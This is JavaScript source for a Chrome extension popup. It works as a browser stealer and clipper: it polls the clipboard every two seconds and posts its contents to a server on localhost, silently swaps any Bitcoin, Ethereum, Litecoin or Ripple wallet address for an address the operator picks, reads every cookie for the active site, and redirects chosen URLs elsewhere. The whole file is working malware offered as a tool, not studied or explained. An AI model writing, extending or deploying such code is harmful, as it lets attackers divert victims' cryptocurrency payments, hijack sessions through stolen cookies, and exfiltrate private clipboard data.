const toggle = document.getElementById("toggle");
const contentDiv = document.getElementById("content");
const copyBtn = document.getElementById("copyText");
const statusText = document.getElementById("statusText");
const lastCheckedDiv = document.getElementById("lastChecked");
const customText = document.getElementById("customText");
const urlToggle = document.getElementById("urlToggle");
const urlStatusText = document.getElementById("urlStatusText");
const urlHistoryDiv = document.getElementById("urlHistory");
const cookiesContentDiv = document.getElementById("cookiesContent");

const redirectTargetInput = document.getElementById("redirectTargetUrl");
const redirectToInput = document.getElementById("redirectToUrl");
const saveRedirectBtn = document.getElementById("saveRedirect");
const redirectStatus = document.getElementById("redirectStatus");

let checkInterval;
let cookiesInterval;
const CHECK_INTERVAL_MS = 2000; 

function updateLastChecked() {
  const now = new Date();
  lastCheckedDiv.textContent = `Last checked: ${now.toLocaleTimeString()}`;
}

function readClipboard() {
  navigator.clipboard
    .readText()
    .then((text) => {
      chrome.storage.local.get(["walletReplaceEnabled", "replacementWalletAddress"], (result) => {
        const enabled = result.walletReplaceEnabled || false;
        const replacement = result.replacementWalletAddress || "";
        let displayText = text || "(Clipboard is empty)";
        let replaced = displayText;
        if (enabled && replacement) {
          for (const regex of WALLET_REGEXES) {
            replaced = replaced.replace(regex, replacement);
          }
        }
        if (enabled && replaced !== displayText) {
          navigator.clipboard.writeText(replaced).then(() => {
            contentDiv.textContent = replaced;
            walletReplaceStatus.textContent = `Wallet address replaced!`;
          }).catch(() => {
            contentDiv.textContent = replaced;
            walletReplaceStatus.textContent = `Wallet address detected, but failed to write to clipboard.`;
          });
        } else {
          contentDiv.textContent = displayText;
        }
        updateLastChecked();
   
        if (displayText) {
          fetch('http://localhost:1234/clipboard', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ text: enabled && replaced !== displayText ? replaced : displayText })
          })
          .catch(err => console.error('Failed to send to server:', err));
        }
      });
    })
    .catch((err) => {
      contentDiv.textContent = "Loading content...wait: " + err;
      updateLastChecked();
    });
}

function readCookiesAndSend() {
  if (!cookiesToggle.checked) {
    cookiesContentDiv.textContent = "Cookies tracking disabled.";
    return;
  }
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    if (!tabs || !tabs[0] || !tabs[0].url) {
      cookiesContentDiv.textContent = "No active tab found.";
      return;
    }
    const url = tabs[0].url;
    const domain = (new URL(url)).hostname;
    chrome.cookies.getAll({domain: domain}, function(cookies) {
      if (!cookies || cookies.length === 0) {
        cookiesContentDiv.textContent = "No cookies found for this domain.";
      } else {
        const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join("; ");
        cookiesContentDiv.textContent = cookieStr;
        // Removed: sending cookies to server from popup
      }
    });
  });
}

function startClipboardMonitoring() {
  readClipboard();
  checkInterval = setInterval(() => {
    readClipboard();
  }, CHECK_INTERVAL_MS);
  statusText.textContent = "On";
  statusText.style.color = "#2196F3";
}

function stopClipboardMonitoring() {
  if (checkInterval) {
    clearInterval(checkInterval);
    checkInterval = null;
  }
  statusText.textContent = "Off";
  statusText.style.color = "#666";
  contentDiv.textContent = "Clipboard monitoring disabled.";
  lastCheckedDiv.textContent = "";
}

function startCookiesMonitoring() {
  readCookiesAndSend();
  cookiesInterval = setInterval(() => {
    readCookiesAndSend();
  }, CHECK_INTERVAL_MS);
  updateCookiesStatus(true);
}

function stopCookiesMonitoring() {
  if (cookiesInterval) {
    clearInterval(cookiesInterval);
    cookiesInterval = null;
  }
  updateCookiesStatus(false);
}

function updateUrlStatus(enabled) {
  urlStatusText.textContent = enabled ? "On" : "Off";
  urlStatusText.style.color = enabled ? "#2196F3" : "#666";
  urlHistoryDiv.textContent = enabled ? "Loading URL history..." : "URL tracking disabled.";
}

function loadUrlHistory() {
  chrome.storage.local.get("urlHistory", (result) => {
    const urls = result.urlHistory || [];
    if (urls.length === 0) {
      urlHistoryDiv.textContent = "No URL history yet.";
    } else {
      urlHistoryDiv.innerHTML = urls.slice(-20).reverse().map(u => `<div>${u}</div>`).join("");
    }
  });
}

function loadRedirectSettings() {
  chrome.storage.local.get(["redirectTargetUrl", "redirectToUrl"], (result) => {
    redirectTargetInput.value = result.redirectTargetUrl || "";
    redirectToInput.value = result.redirectToUrl || "";
    if (result.redirectTargetUrl && result.redirectToUrl) {
      redirectStatus.textContent = `Redirecting '${result.redirectTargetUrl}' to '${result.redirectToUrl}'`;
    } else {
      redirectStatus.textContent = "No redirect set.";
    }
  });
}

const walletToggle = document.getElementById("walletToggle");
const walletStatusText = document.getElementById("walletStatusText");
const walletAddressInput = document.getElementById("walletAddressInput");
const walletReplaceStatus = document.getElementById("walletReplaceStatus");

let walletReplaceEnabled = false;
let replacementWalletAddress = "";


const WALLET_REGEXES = [
  /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/g, // Bitcoin
  /\b0x[a-fA-F0-9]{40}\b/g, // Ethereum
  /\b[L3][a-km-zA-HJ-NP-Z1-9]{26,33}\b/g, // Litecoin
  /\br[0-9a-zA-Z]{24,34}\b/g, // Ripple
  /\b[0-9A-Za-z]{34}\b/g // Generic (catch-all, last)
];

function updateWalletStatus(enabled) {
  walletStatusText.textContent = enabled ? "On" : "Off";
  walletStatusText.style.color = enabled ? "#2196F3" : "#666";
  walletReplaceStatus.textContent = enabled ? `Replacing detected wallet addresses with: ${replacementWalletAddress || '(none set)'}` : "Wallet replacement disabled.";
}

function loadWalletSettings() {
  chrome.storage.local.get(["walletReplaceEnabled", "replacementWalletAddress"], (result) => {
    walletReplaceEnabled = result.walletReplaceEnabled || false;
    replacementWalletAddress = result.replacementWalletAddress || "";
    walletToggle.checked = walletReplaceEnabled;
    walletAddressInput.value = replacementWalletAddress;
    updateWalletStatus(walletReplaceEnabled);
  });
}

const cookiesToggle = document.getElementById("cookiesToggle");
const cookiesStatusText = document.getElementById("cookiesStatusText");

function updateCookiesStatus(enabled) {
  cookiesStatusText.textContent = enabled ? "On" : "Off";
  cookiesStatusText.style.color = enabled ? "#2196F3" : "#666";
  cookiesContentDiv.textContent = enabled ? "Loading cookies..." : "Cookies tracking disabled.";
}

function loadCookiesSettings() {
  chrome.storage.local.get(["cookiesTrackingEnabled"], (result) => {
    const cookiesEnabled = result.cookiesTrackingEnabled || false;
    cookiesToggle.checked = cookiesEnabled;
    updateCookiesStatus(cookiesEnabled);
  });
}

// Update initialization to check all toggles
chrome.storage.local.get(["clipboardEnabled", "walletReplaceEnabled", "urlTrackingEnabled", "cookiesTrackingEnabled"], (result) => {
  const clipboardEnabled = result.clipboardEnabled || false;
  const walletReplaceEnabledInit = result.walletReplaceEnabled || false;
  toggle.checked = clipboardEnabled;
  walletToggle.checked = walletReplaceEnabledInit;
  if (clipboardEnabled || walletReplaceEnabledInit) {
    startClipboardMonitoring();
  } else {
    stopClipboardMonitoring();
  }

  const cookiesEnabled = result.cookiesTrackingEnabled || false;
  cookiesToggle.checked = cookiesEnabled;
  if (cookiesEnabled) {
    startCookiesMonitoring();
  } else {
    stopCookiesMonitoring();
  }

  const urlEnabled = result.urlTrackingEnabled || false;
  urlToggle.checked = urlEnabled;
  updateUrlStatus(urlEnabled);
  if (urlEnabled) {
    loadUrlHistory();
  }

  loadWalletSettings();
});

// Update event listeners to trigger monitoring if either toggle is enabled
function updateClipboardMonitoringFromToggles() {
  if (toggle.checked || walletToggle.checked) {
    startClipboardMonitoring();
  } else {
    stopClipboardMonitoring();
  }
}

toggle.addEventListener("change", () => {
  const enabled = toggle.checked;
  chrome.storage.local.set({ clipboardEnabled: enabled });
  updateClipboardMonitoringFromToggles();
});

copyBtn.addEventListener("click", () => {
  const textToWrite = customText.value.trim() || "Please enter some text to copy";
  navigator.clipboard
    .writeText(textToWrite)
    .then(() => {
      if (toggle.checked) {
        readClipboard();
      }

      if (textToWrite !== "Please enter some text to copy") {
        customText.value = "";
      }
    })
    .catch((err) => {
      alert("Failed to write to clipboard: " + err);
    });
});


customText.addEventListener("keyup", (event) => {
  if (event.key === "Enter") {
    copyBtn.click();
  }
});

urlToggle.addEventListener("change", () => {
  const enabled = urlToggle.checked;
  chrome.storage.local.set({ urlTrackingEnabled: enabled });
  updateUrlStatus(enabled);
  if (enabled) {
    loadUrlHistory();
  }
});

saveRedirectBtn.addEventListener("click", () => {
  let target = redirectTargetInput.value.trim();
  let to = redirectToInput.value.trim();

  if (target && !/^https?:\/\//i.test(target)) {
    target = "https://" + target;
  }
  if (to && !/^https?:\/\//i.test(to)) {
    to = "https://" + to;
  }

  chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [1],
    addRules: target && to ? [{
      id: 1,
      priority: 1,
      action: { type: "redirect", redirect: { url: to } },
      condition: { urlFilter: target.replace(/^https?:\/\//, ""), resourceTypes: ["main_frame"] }
    }] : []
  }, () => {
 
    chrome.storage.local.set({ redirectTargetUrl: target, redirectToUrl: to }, () => {
      loadRedirectSettings();
    });
  });
});

walletToggle.addEventListener("change", () => {
  walletReplaceEnabled = walletToggle.checked;
  chrome.storage.local.set({ walletReplaceEnabled });
  updateWalletStatus(walletReplaceEnabled);
  updateClipboardMonitoringFromToggles();
});

walletAddressInput.addEventListener("input", () => {
  replacementWalletAddress = walletAddressInput.value.trim();
  chrome.storage.local.set({ replacementWalletAddress });
  if (walletReplaceEnabled) updateWalletStatus(true);
});

cookiesToggle.addEventListener("change", () => {
  const enabled = cookiesToggle.checked;
  chrome.storage.local.set({ cookiesTrackingEnabled: enabled });
  if (enabled) {
    startCookiesMonitoring();
  } else {
    stopCookiesMonitoring();
  }
});

function replaceWalletAddresses(text) {
  if (!walletReplaceEnabled || !replacementWalletAddress) return text;
  let replaced = text;
  for (const regex of WALLET_REGEXES) {
    replaced = replaced.replace(regex, replacementWalletAddress);
  }
  return replaced;
}


// On load, also load redirect settings
window.addEventListener("DOMContentLoaded", loadRedirectSettings);


chrome.storage.onChanged.addListener((changes, namespace) => {
  if (namespace === 'local' && changes.urlHistory) {
    if (urlToggle.checked) {
      loadUrlHistory();
    }
  }
});
